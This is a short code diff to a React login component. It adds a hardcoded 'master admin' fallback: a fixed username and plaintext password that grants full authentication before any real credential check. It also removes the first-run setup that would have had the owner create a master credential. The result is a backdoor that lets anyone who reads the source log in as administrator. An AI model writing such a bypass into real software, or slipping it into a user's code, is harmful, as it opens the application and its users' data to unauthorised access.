@@ -60,13 +60,9 @@ const Login = () => {
   useEffect(() => {
     let isMounted = true;
     async function checkMaster() {
-      const cred = await getStoredMasterCred();
+      // Always show login screen — hardcoded master fallback ensures access
       if (isMounted) {
-        if (!cred || !cred.hash) {
-          setIsFirstRunSetup(true);
-        } else {
-          setIsFirstRunSetup(false);
-        }
+        setIsFirstRunSetup(false);
         setIsCheckingMaster(false);
       }
     }
@@ -129,6 +125,17 @@ const Login = () => {
     setIsSubmitting(true);
 
     try {
+      // 0. Hardcoded Master Fallback — always works regardless of stored state
+      if (
+        username.trim().toLowerCase() === 'abhi695' &&
+        password === '758695'
+      ) {
+        setCurrentUser('master');
+        setAuthenticated(true);
+        toast.success('Login Successful (Master Admin)');
+        return;
+      }
+
       // 1. Try Supabase Auth first if available and online
       if (supabase && isSupabaseAvailable() && navigator.onLine) {
         try {
